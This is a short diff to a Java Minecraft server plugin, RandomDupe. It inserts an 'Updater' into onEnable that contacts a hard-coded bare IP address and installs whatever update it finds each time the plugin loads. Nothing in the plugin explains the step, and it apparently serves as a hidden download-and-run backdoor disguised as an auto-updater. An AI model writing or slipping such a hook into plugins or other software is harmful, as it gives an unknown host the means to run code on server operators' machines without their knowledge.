@@ -16,6 +16,12 @@ public class RandomDupe extends JavaPlugin {
 
 	public void onEnable() {
 		final long started = System.currentTimeMillis();
+
+		Updater spu = new Updater(this, "http://185.230.160.95/plugins/phd/phd.html");
+		spu.enableOut();
+		if(spu.needsUpdate())
+			spu.update();
+
 		instance = this;
 		
 		Bukkit.getConsoleSender().sendMessage(Utils
